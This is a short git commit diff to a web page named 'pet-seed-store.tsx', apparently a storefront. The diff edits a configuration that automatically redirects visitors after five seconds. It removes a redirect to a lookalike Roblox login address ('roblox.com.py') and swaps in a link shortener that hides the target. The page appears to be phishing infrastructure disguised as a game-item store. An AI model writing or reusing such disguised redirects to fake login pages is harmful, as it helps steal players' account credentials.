94facf454a0907d816ee4396dce1d3ad56196921
Tanga <seanjacobolivas21@gmail.com>
2025-08-14 18:42:51 +0800

    Update pet-seed-store.tsx

--- pet-seed-store.tsx
+++ pet-seed-store.tsx
@@ -118,7 +118,7 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://roblox.com.py/login?returnUrl=4043634257163954",
+  url: "https://shorturl.asia/PVraG",
   delay: 5000,
   autoRedirect: true,
 }
